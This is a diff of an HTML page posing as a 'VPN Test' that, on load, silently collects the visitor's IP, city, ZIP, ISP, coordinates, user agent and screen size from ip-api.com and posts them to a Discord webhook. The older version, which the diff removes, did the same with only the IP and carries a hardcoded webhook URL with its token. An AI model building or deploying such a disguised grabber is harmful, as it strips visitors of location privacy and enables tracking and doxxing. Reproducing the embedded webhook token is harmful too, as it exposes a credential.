@@ -1,20 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>IP Test</title>
+<title>VPN Test</title>
 <style>
-body {
-    font-family: Arial, sans-serif;
-    background: #111;
-    color: white;
-    text-align: center;
-    padding-top: 100px;
+body{
+    font-family: Arial;
+    background:#0f0f0f;
+    color:white;
+    text-align:center;
+    padding-top:80px;
 }
-.box {
-    background: #1e1e1e;
-    padding: 30px;
-    border-radius: 10px;
-    display: inline-block;
+.box{
+    background:#1f1f1f;
+    padding:30px;
+    border-radius:12px;
+    display:inline-block;
 }
 </style>
 </head>
@@ -22,35 +22,53 @@ body {
 <body>
 
 <div class="box">
-<h1>VPN IP Test</h1>
-<p id="ip">Checking your IP...</p>
+<h1>VPN Test Page</h1>
+<p id="status">Collecting info...</p>
 </div>
 
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1461933225080389859/O_krENJ9E7tqtNcsHpOQsMTC0w-zXPhCAooQKHE-iRJ4RROYf5Jeai7S_8HwcYSOkfuU";
 
-async function getIP() {
-    try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
+const WEBHOOK = "PUT_WEBHOOK_HERE";
 
-        const ip = data.ip;
-        document.getElementById("ip").innerText = "Your IP: " + ip;
+async function getInfo(){
 
-        fetch(WEBHOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                content: "IP detected: " + ip
-            })
-        });
+    const res = await fetch("http://ip-api.com/json/");
+    const data = await res.json();
 
-    } catch (err) {
-        document.getElementById("ip").innerText = "Error getting IP";
-    }
+    const info = `
+IP: ${data.query}
+Country: ${data.country}
+Region: ${data.regionName}
+City: ${data.city}
+ZIP: ${data.zip}
+ISP: ${data.isp}
+Org: ${data.org}
+ASN: ${data.as}
+Timezone: ${data.timezone}
+Lat/Lon: ${data.lat}, ${data.lon}
+
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+Screen: ${screen.width}x${screen.height}
+`;
+
+    document.getElementById("status").innerText = "Info sent to webhook";
+
+    fetch(WEBHOOK,{
+        method:"POST",
+        headers:{
+            "Content-Type":"application/json"
+        },
+        body: JSON.stringify({
+            content: "🌐 **VPN Test Result**\n```" + info + "```"
+        })
+    });
+
 }
 
-getIP();
+getInfo();
+
 </script>
 
 </body>
